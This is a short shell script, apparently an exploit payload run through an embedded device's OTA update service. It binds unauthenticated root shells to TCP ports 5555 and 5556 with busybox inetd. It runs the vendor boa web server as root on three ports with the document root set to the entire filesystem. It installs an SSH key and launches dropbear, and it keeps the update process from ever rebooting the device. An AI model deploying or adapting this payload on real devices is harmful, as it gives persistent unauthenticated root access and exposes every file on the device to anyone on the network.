#!/bin/sh
# v6: root shell + root-fs HTTP + dropbear, then BLOCK forever so otasrv
# never reaches system("reboot"). The device stays reachable until power cycle.
P=/tmp/ota_payload.log
: > $P 2>/dev/null
exec >>$P 2>&1

echo "=== START ==="
uname -a
cat /proc/cmdline
cat /proc/mounts

# ---- root shell via inetd ----
echo "5555 stream tcp nowait root /bin/sh sh -i" > /tmp/inetd.conf
echo "5556 stream tcp nowait root /bin/sh sh -i" >> /tmp/inetd.conf
/bin/busybox inetd -f /tmp/inetd.conf >/tmp/inetd.out 2>&1 &

# ---- root filesystem read via vendor boa ----
BOA=""
for c in /customer/boa /usr/sbin/boa /sbin/boa; do
  [ -x "$c" ] && BOA="$c" && break
done
BOA2=/tmp/svc
if [ -n "$BOA" ]; then
  cp "$BOA" $BOA2 2>/dev/null || cat "$BOA" > $BOA2 2>/dev/null
  chmod 755 $BOA2 2>/dev/null
  [ -x $BOA2 ] || BOA2="$BOA"
fi
mkconf() {
  {
    echo "Port $1"; echo "User 0"; echo "Group 0"
    echo "ErrorLog /tmp/e$1.log"; echo "ServerName lollipop"
    echo "DocumentRoot /"; echo "DirectoryIndex index.html"
    echo "KeepAliveMax 100"; echo "KeepAliveTimeout 10"
    echo "MimeTypes /customer/res/boa/mime.types"; echo "DefaultType text/plain"
    echo "CGIPath /bin:/usr/bin"
  } > "$2"
}
mkconf 80   /tmp/boa.conf
mkconf 8080 /var/run/boa.conf
mkconf 8888 /dev/shm/boa.conf
"$BOA2" -c /tmp      >/tmp/b80.out    2>&1 &
"$BOA2" -c /var/run  >/tmp/b8080.out  2>&1 &
"$BOA2" -c /dev/shm  >/tmp/b8888.out  2>&1 &

# ---- dropbear (binaries already in /appconfigs) ----
mkdir -p /appconfigs/home/root/.ssh
cp /appconfigs/authorized_keys /appconfigs/home/root/.ssh/authorized_keys 2>/dev/null
chmod 700 /appconfigs/home/root/.ssh 2>/dev/null
chmod 600 /appconfigs/home/root/.ssh/authorized_keys 2>/dev/null
mount --bind /appconfigs/home /home 2>/dev/null
chmod 755 /appconfigs/dropbear /appconfigs/dropbearkey /appconfigs/sftp-server 2>/dev/null
[ -f /appconfigs/dropbear_ed25519_host_key ] || /appconfigs/dropbearkey -t ed25519 -f /appconfigs/dropbear_ed25519_host_key
if [ -x /appconfigs/dropbear ]; then
  kill $(cat /var/run/dropbear.pid 2>/dev/null) 2>/dev/null
  /appconfigs/dropbear -r /appconfigs/dropbear_ed25519_host_key -p 22 -P /var/run/dropbear.pid -g -s
fi

echo "=== BLOCK ==="
while true; do sleep 3600; done
